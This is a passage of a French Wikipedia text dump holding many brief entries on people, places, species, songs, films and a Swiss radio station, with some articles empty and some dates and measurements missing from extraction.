Les haches en jadéite venue du sud-ouest des Alpes constituent à ce titre une des principales exceptions. La présence d'une petite lamelle d'obsidienne dont l'origine n'a pas encore été déterminée témoigne aussi d'échanges plus lointains.
Inversement, les productions très spécifiques de cette culture ne se retrouvent qu'exceptionnellement au-delà de ses limites géographiques. Il n'y a aucun indice d'une influence des autres régions. 
La culture de Vinča, en partie contemporaine, qui se développe dans le centre-nord des Balkans semble très largement indépendante.
L'influence de cette culture sur les cultures suivantes est également marginale ; ainsi, dès la fin du Ve millénaire av. J.-C., les productions artisanales spectaculaires s'effondrent, la métallurgie du cuivre se limite alors à des petits objets, il n'y a quasiment plus aucun objet en or.

</doc>
<doc id="7902404" url="https://fr.wikipedia.org/wiki?curid=7902404" title="Abraham Woodhull">
Abraham Woodhull

Abraham Woodhull ( - ) était un membre du réseau d'espionnage Culper Ring pendant la révolution américaine. Après la révolution, il a servi comme juge. Il se peut que le personnage de James Fenimore Cooper, Harry Birch, ait été fondé sur son travail en tant qu'espion.
Durant la révolution, Abraham incarna Samuel Culper, son nom d'espion aux côtés de Robert Townsend.

</doc>
<doc id="7902406" url="https://fr.wikipedia.org/wiki?curid=7902406" title="Kay van Dijk">
Kay van Dijk

Kay van Dijk est un joueur néerlandais de volley-ball né le à Oosterbeek (Gueldre). Il mesure et joue attaquant. Il totalise 144 sélections en équipe des Pays-Bas.

</doc>
<doc id="7902411" url="https://fr.wikipedia.org/wiki?curid=7902411" title="Leptolalax sabahmontanus">
Leptolalax sabahmontanus

Leptolalax sabahmontanus est une espèce d'amphibiens de la famille des Megophryidae.
Répartition.
Cette espèce est endémique des montagnes du Sabah en Malaisie orientale. Elle se rencontre entre 754 et d'altitude.
Étymologie.
Cette espèce est nommée en référence au lieu de sa découverte, les montagnes du Sabah.

</doc>
<doc id="7902412" url="https://fr.wikipedia.org/wiki?curid=7902412" title="One Sunday Afternoon (film, 1948)">
One Sunday Afternoon (film, 1948)

 est un film américain réalisé par Raoul Walsh, sorti en 1948.
Synopsis.
Un dimanche après-midi, Biff Grimes, un dentiste de New York se remémore le bon vieux temps avec son ami Nick, le barbier. Il reçoit un appel d'urgence pour soigner la dent d'Hugo Barnstead, le conseiller municipal. Biff en veut à Hugo, qu'il connait depuis sa jeunesse, mais il accepte de l'aider tout en imaginant sa vengeance. Leur rivalité remonte à des années auparavant, lorsque Biff et Hugo étaient tous deux amoureux de la belle Virginia Brush...

</doc>
<doc id="7902417" url="https://fr.wikipedia.org/wiki?curid=7902417" title="Jeanne de Toulouse (homonymie)">
Jeanne de Toulouse (homonymie)



</doc>
<doc id="7902419" url="https://fr.wikipedia.org/wiki?curid=7902419" title="Izabelin (Varsovie-ouest)">
Izabelin (Varsovie-ouest)

Izabelin [izaˈbɛlin] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il est le chef-lieu (siège administratif) de la gmina d'Izabelin.
Il se situe à environ 7kilomètres au nord de Ożarów Mazowiecki et à 5 kilomètres au nord-ouest de Varsovie.
Le village a une population de 3 405 habitants en 2006.

</doc>
<doc id="7902425" url="https://fr.wikipedia.org/wiki?curid=7902425" title="Vladimir Ivanov (volley-ball, 1985)">
Vladimir Ivanov (volley-ball, 1985)

Vladimir Ivanov (en ) est un joueur russe de volley-ball né le à Moscou (alors en URSS). Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7902427" url="https://fr.wikipedia.org/wiki?curid=7902427" title="Ambroise Blaurer">
Ambroise Blaurer



</doc>
<doc id="7902437" url="https://fr.wikipedia.org/wiki?curid=7902437" title="Aéroport Tenzing-Hillary">
Aéroport Tenzing-Hillary

L'aéroport de Lukla , connu sous le nom d’aéroport Tenzing-Hillary, est un altiport desservant la localité de Lukla au Népal. Il comporte une piste d'environ en pente de 12 %, facilitant la prise de vitesse au décollage et le freinage à l'atterrissage. L'aéroport dessert principalement le camp de base du mont Everest. Depuis , la piste est asphaltée ce qui améliore la sécurité des vols.
Les conditions climatiques extrêmes liées à l'altitude et la région et les caractéristiques de la piste en font l'aéroport le plus dangereux du monde. 
En , l'aéroport est renommé en l'honneur d'Edmund Hillary et du Sherpa Tensing Norgay, premières personnes à avoir gravi l'Everest.
Infrastructures.
L'aéroport est asphalté et seulement accessible aux hélicoptères, aux petits avions et aux avions à décollage et atterrissage court comme le DHC-6 Twin Otter ou le Dornier 228.
La piste a une inclinaison de 12 % et une largeur de .
Les avions utilisent la 06 pour atterrir et la 24 pour décoller.
Compagnies et destinations.
L'aéroport est ouvert de du matin jusqu'à environ.

</doc>
<doc id="7902443" url="https://fr.wikipedia.org/wiki?curid=7902443" title="Hornówek (Mazovie)">
Hornówek (Mazovie)

Hornówek [xɔrˈnuvɛk] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres au sud-ouest d'Izabelin (chef-lieu), 8 kilomètres au nord de Ożarów Mazowiecki et à 16 kilomètres au nord-ouest de Varsovie.
Le village a une population de 1 054 habitants en 2000.

</doc>
<doc id="7902445" url="https://fr.wikipedia.org/wiki?curid=7902445" title="Aéroport de Lukla">
Aéroport de Lukla



</doc>
<doc id="7902448" url="https://fr.wikipedia.org/wiki?curid=7902448" title="OFAEnR">
OFAEnR



</doc>
<doc id="7902457" url="https://fr.wikipedia.org/wiki?curid=7902457" title="White Noise (chanson)">
White Noise (chanson)

 est le deuxième single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013. Il est chanté par Aluna Francis.

</doc>
<doc id="7902458" url="https://fr.wikipedia.org/wiki?curid=7902458" title="Klarenthal">
Klarenthal

Klarenthal est un quartier de la ville allemande de Sarrebruck en Sarre. 

</doc>
<doc id="7902459" url="https://fr.wikipedia.org/wiki?curid=7902459" title="Leptolalax zhangyapingi">
Leptolalax zhangyapingi

Leptolalax zhangyapingi est une espèce d'amphibiens de la famille des Megophryidae.
Répartition.
Cette espèce est endémique de la province de Chiang Mai en Thaïlande. Elle se rencontre à environ d'altitude.
Description.
Lors de la description originale, les 7 mâles mesuraient entre et .
Étymologie.
Cette espèce est nommée en l'honneur de Ya-ping Zhang.

</doc>
<doc id="7902460" url="https://fr.wikipedia.org/wiki?curid=7902460" title="Patinement">
Patinement



</doc>
<doc id="7902466" url="https://fr.wikipedia.org/wiki?curid=7902466" title="Geneviève Senger">
Geneviève Senger

Geneviève Senger, née à Mulhouse en , est une auteure de livres pour la jeunesse et romancière française .
Biographie.
Infirmière durant dix ans elle se consacre ensuite à l'écriture. Elle a écrit un temps sous le pseudonyme J. Esther Singer. Elle a fait ses études au collège Jeanne d'Arc à Mulhouse, puis à l'Institut Sainte Ursule où elle a obtenu un baccalauréat série littéraire. Elle vit actuellement à Strasbourg.

</doc>
<doc id="7902468" url="https://fr.wikipedia.org/wiki?curid=7902468" title="Feulement">
Feulement

Le feulement (du verbe feuler) est un cri poussé par certains félidés, en complément du rugissement et du ronronnement.
Sommaire.
Le félin feule (on dit familièrement qu'il crache) en expulsant rapidement de l’air par la gorge, sous la forme d'un « crouir » aigu et brutal. Le feulement est souvent associé à une posture de défense ou d'attaque, les yeux fixes et aux aguets, le corps tendu prêt à bondir.
Chez certains félidés (panthère nébuleuse, panthère des neiges), les individus s'appellent pour se trouver. Ils se choisissent, se cherchent. Les feulements s'accordent. Le tigre feule, miaule, râle, rauque, ronronne et rugit.
Anatomie.
L'os hyoïde, chez les petits félins, ne peut pas vibrer ; ils ne peuvent qu'émettre une plainte proche du miaulement.

</doc>
<doc id="7902471" url="https://fr.wikipedia.org/wiki?curid=7902471" title="Serhiy Chulha">
Serhiy Chulha

Serhiy Leonidovytch Chulha (en ) est un joueur ukrainien de volley-ball né le . Il mesure et joue passeur. Il est international ukrainien.

</doc>
<doc id="7902472" url="https://fr.wikipedia.org/wiki?curid=7902472" title="You and Me (chanson de Disclosure)">
You and Me (chanson de Disclosure)

You &amp; Me est le troisième single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013. Il est chanté par Eliza Doolittle.
Le remix effectué par Flume permet de faire connaître davantage en France cette chanson, utilisée par un spot publicitaire de l'équipementier sportif Lacoste diffusé en 2014. La fanfare techno Meute a également connu une notoriété importante pour sa version instrumentale du remix de Flume en 2018.

</doc>
<doc id="7902475" url="https://fr.wikipedia.org/wiki?curid=7902475" title="You &amp; Me">
You &amp; Me



</doc>
<doc id="7902483" url="https://fr.wikipedia.org/wiki?curid=7902483" title="Curzio Maltese">
Curzio Maltese

Curzio Maltese (né le à Milan et mort le dans la même ville) est un journaliste, écrivain et un homme politique italien, membre du parti L'autre Europe avec Tsipras, pour lequel il est élu député européen le 25 mai 2014.
Biographie.
Curzio Maltese est éditorialiste à "", où il est aussi critique de cinéma et de télévision.

</doc>
<doc id="7902484" url="https://fr.wikipedia.org/wiki?curid=7902484" title="F for You">
F for You

F for You est le quatrième single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013.
Remix en featuring avec Mary J. Blige.
Le sort une ré-édition du single, cette fois-ci interprété en featuring avec Mary J. Blige.

</doc>
<doc id="7902486" url="https://fr.wikipedia.org/wiki?curid=7902486" title="Help Me Lose My Mind">
Help Me Lose My Mind

 est le cinquième single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013. Il est chanté par London Grammar.

</doc>
<doc id="7902489" url="https://fr.wikipedia.org/wiki?curid=7902489" title="Affection respiratoire">
Affection respiratoire



</doc>
<doc id="7902490" url="https://fr.wikipedia.org/wiki?curid=7902490" title="GRRIF">
GRRIF

GRRIF (BNJ Suisse SA) est une radio privée suisse qui diffuse en FM dans l’Arc jurassien (Nord-Vaudois, canton de Neuchâtel, région biennoise, Jura bernois et canton du Jura) depuis , et en DAB+ dans toute la Suisse romande depuis . Ses studios sont situés à Delémont. Elle appartient au groupe de Pierre Steulet, patron de BNJ FM, composée de RFJ, RTN et RJB. Ses programmes comprennent 90 % de musique, de style rock, pop et alternatif. Elle devient une radio purement musicale en 2022.
Historique.
Les bases administratives.
GRRIF est née d’une décision fédérale de redéfinir les zones de desserte des radios privées de Suisse. Deux concessions étaient disponibles dans la zone de l'Arc jurassien ; la première, avec quote-part de la redevance, a été attribuée à BNJ FM et compte les programmes RTN, RFJ et RJB ; la seconde, sans droit à la redevance, a été accordée en automne 2008 au projet Arc FM base du programme GRRIF, mené également par le groupe BNJ FM. À la suite du recours d’un concurrent, le Tribunal administratif fédéral a définitivement accordé la concession à Arc FM SA en , devenue depuis BNJ Suisse SA.
La création des programmes.
GRRIF a commencé à émettre le , soit deux ans après le feu vert des autorités fédérales. Durant ce laps de temps, les infrastructures techniques ont été mises en place ; la géographie de la région, faite de montagnes et de vallées, nécessitait l’implantation de nombreux émetteurs afin de couvrir un maximum des de la zone de concession. On en recensait 19 au printemps 2014, sans tenir compte des installations dans certains tunnels autoroutiers. Parallèlement, un directeur d’antenne et rédacteur en chef a été nommé en la personne de Cédric Adrover pour prendre en charge la création des programmes. Il s’est entouré de huit personnes, expérimentées ou débutantes : des animateurs, des journalistes et un programmateur musical.
Le lancement.
Deux mois avant la mise en ondes, l’équipe de GRRIF a lancé une opération de teasing qui misait sur la curiosité du public, avec notamment l’affiche d’un faux festival, placardée dans toute la région, et laissant entendre l’arrivée prochaine d’artistes représentatifs de la programmation musicale de la future radio. Jouant de l’orthographe du nom de la station, le matériel promotionnel double régulièrement les « R » ; ainsi, le slogan récurrent de la campagne et de la radio est : « DéchiRRe ta RRoutine ». La conférence de presse annonçant officiellement le lancement d’un nouveau programme radio a eu lieu le , un peu moins de deux semaines avant la première prise d’antenne.
Difficultés financières et transformation en radio purement musicale.
Souffrant d'un manque de recettes publicitaires en raison de la taille réduite du bassin de population autour de Delémont, la radio rencontre rapidement des difficultés financières. 
En 2017, une association de soutien à la radio est créée pour assurer une partie de son budget annuel de fonctionnement de 500 000 francs. En 2022, la radio se sépare de ses trois animateurs et devient purement musicale.
Style de la radio.
GRRIF s'est fixé pour objectif d'être une alternative aux stations régionales préexistantes, RTN, RJB et RFJ, historiquement basées sur l’information de proximité et les hits musicaux. Elle vise un public plus jeune. GRRIF cherche également à se distinguer des autres radios par le ton très libre de ses interventions, y compris dans les rendez-vous d’information. Sur son site internet, GRRIF décrit sa programmation musicale comme « ouverte mais exigeante, oscillant entre rock, électro, indie, reggae, hip-hop, soul et blues. Elle puise sans vergogne dans le répertoire de ces 70 dernières années. »
Premières audiences.
Les premiers chiffres officiels d’audimat sont ceux du deuxième semestre 2012, le premier ayant été incomplet. Selon la société Mediapulse SA, chargée par la Confédération de mesurer la consommation de radio et de télévision en Suisse, GRRIF compte alors sur l'ensemble de la Suisse (le cumul des régions alémanique et romande est rendu nécessaire par la présence, dans la zone de diffusion, de Bienne, considérée par Mediapulse comme alémanique).
En 2022, la radio compte près de 26 000 auditeurs quotidiens.
Extension à la Suisse romande via la technologie DAB+.
GRRIF est l’un des programmes du second bouquet numérique de Suisse romande, diffusé via la technologie DAB+ dès le . Les 22 sites de diffusion du canal 10b permettent à la station de couvrir l’essentiel de la Suisse francophone.
Voir aussi.
Liens externes.
 

</doc>
<doc id="7902497" url="https://fr.wikipedia.org/wiki?curid=7902497" title="60 Seconds of Solitude in Year Zero">
60 Seconds of Solitude in Year Zero

 est une compilation événementielle de courts métrages projetée une seule fois le dans le port de Tallinn, en Estonie. Le film, estonien, est une compilation de soixante courts métrages d'une durée d'une minute chacun réalisés par soixante cinéastes du monde entier sur le thème de la mort au cinéma.
Le projet, conçu comme une ode à la pellicule 35 mm et destiné à la préservation de la liberté de pensée au cinéma, a été conçu par Veiko Õunpuu assisté de et financé par Tallinn, Capitale européenne de la culture 2011, le Ministère estonien de la culture et du .

</doc>
<doc id="7902501" url="https://fr.wikipedia.org/wiki?curid=7902501" title="Prix Jean-Le-Duc">
Prix Jean-Le-Duc

Le prix Jean-Le-Duc, ou prix Jean-Leduc, est un ancien Prix de l'Académie française. Créé en 1972 et décerné jusqu'en 1993, il était . Il a été créé en hommage à Jean Le Duc, qui avait présidé pendant trente ans la « Société nouvelle des établissements Gaumont ». À la place de cette récompense, l'Académie française a créé le prix René-Clair en 1994.
Le film "Églantine" a été le premier film récompensé par ce prix pour la qualité de son scénario.
Liste des lauréats.
De 1972 à 1993 ont été récompensés :

</doc>
<doc id="7902510" url="https://fr.wikipedia.org/wiki?curid=7902510" title="Voices (chanson)">
Voices (chanson)

Voices est le sixième single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013. Il est chanté par Sasha Keable.

</doc>
<doc id="7902511" url="https://fr.wikipedia.org/wiki?curid=7902511" title="Déjeuner champêtre">
Déjeuner champêtre



</doc>
<doc id="7902515" url="https://fr.wikipedia.org/wiki?curid=7902515" title="Liste des porte-drapeaux à la cérémonie d'ouverture des Jeux paralympiques d'hiver de 2014">
Liste des porte-drapeaux à la cérémonie d'ouverture des Jeux paralympiques d'hiver de 2014



</doc>
<doc id="7902532" url="https://fr.wikipedia.org/wiki?curid=7902532" title="The Foreclosure">
The Foreclosure

 est un film muet américain réalisé par Allan Dwan et sorti en 1912.
Synopsis.
Joe le Mexicain tient le vieux John Watkin grâce à une hypothèque sur son ranch. En échange, il lui demande la main de sa fille Jessie. Mais Watkin meurt d'une crise cardiaque…

</doc>
<doc id="7902540" url="https://fr.wikipedia.org/wiki?curid=7902540" title="Jakob Gartner">
Jakob Gartner

Jakob Gartner, né le à Prerau, décédé le à Vienne, est un architecte autrichien, spécialisé dans la construction de synagogues.
Biographie.
Jakob Gartner est né dans une famille juive de cinq enfants, à Prerau dans la région d'Olmütz (maintenant Olomouc), à l'époque partie de l'empire d'Autriche. Son père Isaak Löbl (vers 1830-1913) est minotier. De 1879 à 1883, Jakob Gartner poursuit des études à l'école professionnelle d'État de Brünn (maintenant Brno en République tchèque), avant d'effectuer un stage de deux ans dans l'entreprise de construction "Knauer, Groß &amp; Löwenfeld". Il complète sa formation en travaillant pendant une année comme dessinateur en architecture chez Carl Korn à Bielitz, puis deux ans avec Hugo von Wiedenfeld et trois ans à Vienne chez Gustav Matthies. En même temps, de 1886 à 1888, il étudie à l"'Académie des beaux-arts de Vienne" sous la direction de l'architecte et historien de l'art, Karl von Hasenauer. Un an après la fin de ses études, en 1888, il ouvre son propre cabinet d'architecte. 
En 1908, il épouse Anna, née Lanzer, dont il élèvera le fils Robert Grünbaum qu'elle a eu de son premier mariage. 
En plus des bâtiments résidentiels et commerciaux, Gartner se spécialise dans la construction de synagogues, dont il a acquis une connaissance spéciale. À Vienne, il est l'architecte de la synagogue de la Braunhubergasse, de celle de l'Humboldtgasse et de celle de la Kluckygasse dans le quartier Brigittenau qui seront toutes les deux détruites par les nazis lors de la nuit de Cristal, du 9 au . 
Entre 1914 et 1917, Gartner dessine les plans du nouveau cimetière juif de Vienne, situé dans la partie est du Cimetière central de Vienne, en remplacement de l'ancien cimetière juif, situé à l'ouest du cimetière central, et devenu saturé. Il prévoit une salle de prière et de recueillement, mais compte tenu de la guerre et pour des raisons financières, seul un bâtiment provisoire verra le jour. Un nouveau bâtiment définitif sera construit entre 1926 et 1928 selon les plans de l'architecte Ignaz Reiser. 
Gartner est membre du comité directeur de la communauté juive de Vienne. 
Jakob Gartner décède à Vienne en 1921 à l'âge de 60 ans et est enterré au cimetière de Döbling, arrondissement de Vienne.
Ses constructions.
Synagogues.
Synagogues détruites
Synagogues en activité (même partielle)
Habitations et bâtiments industriels (liste partielle).
Les constructions d'habitations bourgeoises de Jakob Gartner sont assez représentatives. Ces maisons d'angle possèdent souvent des toits rehaussés de dôme et des pignons à corniches 

</doc>
<doc id="7902543" url="https://fr.wikipedia.org/wiki?curid=7902543" title="GPRA (G protein-coupled receptor for asthma susceptibility)">
GPRA (G protein-coupled receptor for asthma susceptibility)



</doc>
<doc id="7902553" url="https://fr.wikipedia.org/wiki?curid=7902553" title="Alekseï Ploujnikov">
Alekseï Ploujnikov

Alekseï Vladimirovitch Ploujnikov (en ) est un joueur russe de volley-ball né le . Il mesure et joue attaquant.

</doc>
<doc id="7902557" url="https://fr.wikipedia.org/wiki?curid=7902557" title="Jonathan Haidt">
Jonathan Haidt

Jonathan David Haidt (né en 1963 à New York) est un universitaire américain, spécialisé en psychologie sociale et professeur d'éthique et de philosophie politique. Ses travaux portent sur la morale. 
Professeur assistant à l'université de Virginie de 1995 à 2011, il enseigne par la suite à la Stern School of Business de l'université de New York.
Il a publié plusieurs livres, notamment ' (2006), "The Righteous Mind" (2012), qui est devenu un "best-seller" du "New York Times", et ' (2018). Il est considéré comme l'un des plus grands « penseurs globaux » ("") par "Foreign Policy" et l'un des plus grands intellectuels de la planète par "Prospect magazine". Ses trois conférences TED ont été visionnées plusieurs millions de fois.
Biographie.
Haidt naît à New York, au sein d'une famille juive ashkénaze d'origine polonaise et russe, et grandit dans une banlieue résidentielle de la classe moyenne, à Scarsdale. En 1985, il obtient un BA à l'université Yale, puis, en 1992, un PhD en psychologie de l'université de Pennsylvanie. Par la suite, il fait un postdoctorat sur la à l'université de Chicago sous la supervision de , et . Il remporte une bourse Fulbright afin d'effectuer trois mois de recherches sur la moralité à Odisha, en Inde.
En 1995, Haidt est engagé comme assistant professor à l'université de Virginie. Il remporte quatre prix liés à son enseignement.
En 1999, Haidt s'intéresse à la toute nouvelle psychologie positive. Ses recherches mènent à la publication de ', en 2003, puis à ' en 2006.
À partir de 2004, il applique la psychologie morale à la politique, effectuant des recherches sur les fondements psychologiques des idéologies politiques. Cette démarche l'amène à la publication de "" en 2012.
En 2007 et 2008, il est professeur invité à l'université de Princeton.
Depuis 2011, Haidt travaille à Leonard N. Stern School of Business. Ses recherches actuelles concernent la psychologie morale de l'éthique des affaires. Il est également engagé dans les efforts visant à favoriser une plus grande civilité politique et d'accroître la diversité idéologique de la psychologie sociale et d'autres sciences sociales.
En 2024, Haidt a publié le livre "The Anxious Generation: How the Great Rewiring of Childhood is Causing an Epidemic of Mental Illness". Dans ce livre, Haidt examine les effets des technologies modernes telles que les smartphones et les médias sociaux sur la santé mentale et le bien-être des jeunes. Haidt discute de la transition d'une enfance basée sur le jeu à un environnement plus orienté vers la technologie, qui a entraîné une augmentation de l'anxiété, de la dépression et d'autres troubles mentaux chez les adolescents. Il analyse comment le manque de temps de jeu non structuré et l'exposition excessive aux écrans ont contribué à ces problèmes. Il explore également le rôle des médias sociaux dans le renforcement du sentiment de pression sociale, de comparaison et d'isolement chez les jeunes. En outre, Haidt examine plus en détail la question de la dysphorie de genre et sa relation potentielle avec les tendances des médias sociaux. Il remarque que historiquement, les taux de dysphorie de genre étaient plus élevés chez les hommes nés cherchant une opération de réassignation sexuelle, mais qu'il y a eu une rapide augmentation chez les femmes nées, notamment parmi les adolescents de la génération Z, cherchant un traitement pour la dysphorie de genre. Haidt discute de la dynamique complexe de l'identité de genre et de l'influence des facteurs sociaux et culturels, y compris les interactions en ligne, sur la compréhension et l'expérience du genre.
La métaphore de l'éléphant et du cavalier.
Les observations de l'intuitionnisme social, que les intuitions viennent en premier et la rationalisation en second, ont conduit à la métaphore de l'éléphant et du cavalier. Le cavalier représente les processus contrôlés et conscients et l'éléphant représente tous les processus automatiques. Cette métaphore reprend la pensée de Daniel Kahneman résumée dans '. Cette métaphore est largement utilisée dans ses deux livres ' (2006) et "The Righteous Mind" (2012).
Le cavalier est penché sur la positivité et se concentre sur des problèmes complexes, alors que l'éléphant est davantage penché sur des informations négatives et ne sait résoudre seulement que des problèmes simples. La face cavalier évoque notre néocortex, notre côté rationnel, complémentaire à cette de l'éléphant.
Les théories de Haidt.
L'approche intuitionniste sociale.
Selon le modèle intuitionniste social de Haidt, le jugement moral est le résultat des intuitions qui représentent un processus cognitif rapide et automatique dont la conclusion apparaît spontanément. Elles sont ensuite suivies par une évaluation de l'ensemble des vertus sous le nom d'un jugement. Finalement, le raisonnement moral prend lieu pour traiter l'information trouvée. Il se fait en plusieurs étapes telles que la recherche des preuves, l'évaluation des preuves et le test des hypothèses. Habituellement, ce processus se produit lentement et peut être contrôlé même s'il demande un effort important.
Les émotions morales.
Selon Haidt, l'émotion est une source de motivation pour un certain genre d'action. Il définit donc les émotions morales comme étant des motivations pour les actions morales et des réponses aux violations morales. Ces émotions amènent l'être humain à se soucier de son monde social et à remettre en question son intégrité. Haidt forme quatre groupes différents qui comportent une liste d'émotions qu'il juge morales : la famille de la réprobation (le dégoût, la colère, le mépris, l'indignation et l'aversion), le souci de soi (la honte, la culpabilité et la gêne), la souffrance des autres, et le mérite des autres (la compassion et la gratitude). Il précise que ces familles d'émotions morales sont présentes dans toutes les cultures du monde.
Psychologie de la morale.
Selon le psychologue Haidt, les recherches en psychologie morale sont biaisées par la population ciblée dans les études de psychologie sociale occidentale : les étudiants forment un groupe aberrant d'un point de vue psychologique et moral, selon Haidt. Ce facteur explique en grande partie le problème de reproductibilité des études en psychologie sociale. Il explique les erreurs méthodologiques dans le premier chapitre du livre "The Righteous Mind". Il propose donc, avec ses collègues Joseph Craig et Jesse Graham, une approche différente définissant la morale de façon plus élargie, afin d'inclure les préoccupations et les valeurs qui sont présentes partout sur la planète.
Il propose une théorie, « la théorie des fondements moraux » qui inclut cinq vertus présentes dans toutes les cultures. Aux deux vertus classiques de justice et de soin d'autrui sont ajoutées les vertus, réputées conservatrices, de loyauté au groupe, d’obéissance à l'autorité et de pureté morale. Les valeurs de loyauté au groupe et d’obéissance à l'autorité ont en commun d'améliorer les liens entre les groupes sociaux.

</doc>
<doc id="7902566" url="https://fr.wikipedia.org/wiki?curid=7902566" title="Inal Tavasiev">
Inal Tavasiev

Inal Vitalievitch Tavasiev (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7902568" url="https://fr.wikipedia.org/wiki?curid=7902568" title="Jiří Načeradský">
Jiří Načeradský

 (né le à Sedlec-Prčice – mort le à Prague) est un peintre et graphiste tchèque.

</doc>
<doc id="7902574" url="https://fr.wikipedia.org/wiki?curid=7902574" title="Anthony Lawrence">
Anthony Lawrence

Anthony John Lawrence, né le à Wimbledon et mort le à Hong Kong (à 101 ans), est un journaliste britannique, qui fut le correspondant en chef de la BBC en Extrême-Orient durant la Guerre du Vietnam.
Biographie.
Les débuts.
Natif du quartier londonien de Wimbledon, il est le quatrième d'une fratrie de cinq enfants. Il effectue une partie de sa scolarité à King's College School. Sa vocation journalistique lui est inspirée par les exemples de son grand-père et de son oncle, qui ont tous deux travaillé dans la presse écrite. Au terme de son cursus à l'école secondaire, il écrit pour des hebdomadaires londoniens.
Quand éclate la Seconde Guerre mondiale, il sert dans l'armée de terre britannique au sein de la Royal Artillery, où il atteint le grade de capitaine.
Carrière journalistique (1956-1973).
Son oncle, Arthur Lawrence, fut journaliste et correspondant diplomatique pour le "Daily Mail". Anthony voit le début de sa carrière journalistique interrompue par la guerre et la reprend à partir de 1945, année où il intègre la BBC World Service, diffuseur de programmes radiophoniques à travers le monde. Il est envoyé à Singapour en 1956 en tant que correspondant pour la BBC en Extrême-Orient, avant de gagner Hong Kong, qui est encore à cette époque une colonie britannique, deux ans plus tard, en 1958. Il est impliqué dans la réalisation de deux documentaires, "Born Chinese" and "From Our Correspondent".
Anthony Lawrence travaille pour la BBC de 1956 à 1973 à temps plein, alors que le conflit vietnamien secoue l'Asie du Sud-Est. Par la suite, il apporte une contribution occasionnelle, notamment lors de la cérémonie aboutissant à la rétrocession de Hong Kong à la Chine en 1997.
Fin de carrière.
Alors qu'il ralentit son activité de journaliste pour la BBC, Anthony veut se consacrer à l'écriture de livres, dont le premier s'intitule " Foreign Correspondent", œuvre autobiographique publiée en 1972. D'autres ouvrages suivent, comme "The Love of China" (1980) ou "The Fragrant Chinese" (1993).
Il est fait Membre de l'Ordre de l'Empire britannique (OBE) en 2013 pour avoir, entre autres, supporté la tenue de programmes éducatifs destinés aux enfants vietnamiens réfugiés à Hong Kong.
Il fut marié deux fois. Sa première femme, Sylvia, décède lors de la Seconde Guerre mondiale. Il se remarie avec Irmgard Noll, de nationalité allemande, en 1946. De leur union, naît un fils, Alex, qui accompagne sa famille à Singapour, mais qui est envoyé suivre des études en Angleterre lors du déménagement de ses parents à Hong Kong.
Anthony Lawrence décède à Singapour le , à l'âge de 101 ans.
Références.
Cet article est tiré en grande partie de l'article en anglais .

</doc>
<doc id="7902577" url="https://fr.wikipedia.org/wiki?curid=7902577" title="Béguélé">
Béguélé

Béguélé est un village du département et la commune rurale d'Ouo, situé dans la province de la Comoé et la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902578" url="https://fr.wikipedia.org/wiki?curid=7902578" title="Bini (Burkina Faso)">
Bini (Burkina Faso)

Bini est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902582" url="https://fr.wikipedia.org/wiki?curid=7902582" title="Prix Écrans canadiens 2014">
Prix Écrans canadiens 2014



</doc>
<doc id="7902583" url="https://fr.wikipedia.org/wiki?curid=7902583" title="Cathédrale de l'Assomption de Iaroslavl">
Cathédrale de l'Assomption de Iaroslavl



</doc>
<doc id="7902587" url="https://fr.wikipedia.org/wiki?curid=7902587" title="Gyre de Weddell">
Gyre de Weddell

Le gyre de Weddell est un gyre océanique proche de l'Antarctique, il se situe dans la mer de Weddell. C'est un courant tournant dans le sens horaire (courant cyclonique dans l'hémisphère sud) formé par l’interaction du courant circumpolaire antarctique sur le plateau continental de l'Antarctique. Avec l'aide du transport d'Ekman, c'est une zone très riche en nutriments et en biodiversité.

</doc>
<doc id="7902588" url="https://fr.wikipedia.org/wiki?curid=7902588" title="Dagninikorosso">
Dagninikorosso

Dagninikorosso est un village du département et la commune rurale d'Ouo, situé dans la province de la Comoé et la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902589" url="https://fr.wikipedia.org/wiki?curid=7902589" title="Dapala">
Dapala

Dapala est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902590" url="https://fr.wikipedia.org/wiki?curid=7902590" title="Ruskin Bond">
Ruskin Bond

Ruskin Bond, né le à Kasauli au Punjab (Inde), est un écrivain indien d'ascendance anglaise. Il a écrit plus de trois cents nouvelles, essais et romans.
Biographie.
Ruskin Bond, fils de Edith Clerke et Aubrey Bond, est né à Kasauli. Il a grandi à Dehradun et a été élevé par sa grand-mère.
Le premier roman qu'il a écrit, "The Room on the Roof", a gagné le prix John-Llewellyn-Rhys en 1957. Il a travaillé quelques années comme journaliste à Delhi et à Dehradun. On lui a attribué le Padma Shri en 1999 et le Padma Bhushan en 2014. 
Il habite à Landour depuis 1964.
Style littéraire.
La plupart de ses œuvres sont influencées par sa vie près de l'Himalaya où il a grandi.
"The Room On The Roof" a été écrit quand il avait 17 ans et publié quand il en avait 21.
"The Flight Of Pigeons" a été adapté dans un film, "Junoon", et "The Room On the Roof" a été adapté par la BBC dans une série télé. 

</doc>
<doc id="7902592" url="https://fr.wikipedia.org/wiki?curid=7902592" title="Nikita Vichnevetski">
Nikita Vichnevetski

Nikita Vichnevetski (en ) est un joueur russe de volley-ball né le . Il mesure et joue libero.

</doc>
<doc id="7902595" url="https://fr.wikipedia.org/wiki?curid=7902595" title="Gonga (Ouo)">
Gonga (Ouo)

Gonga est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902596" url="https://fr.wikipedia.org/wiki?curid=7902596" title="Gonga">
Gonga

Gonga peut désigner :

</doc>
<doc id="7902597" url="https://fr.wikipedia.org/wiki?curid=7902597" title="Prix des Critiques">
Prix des Critiques

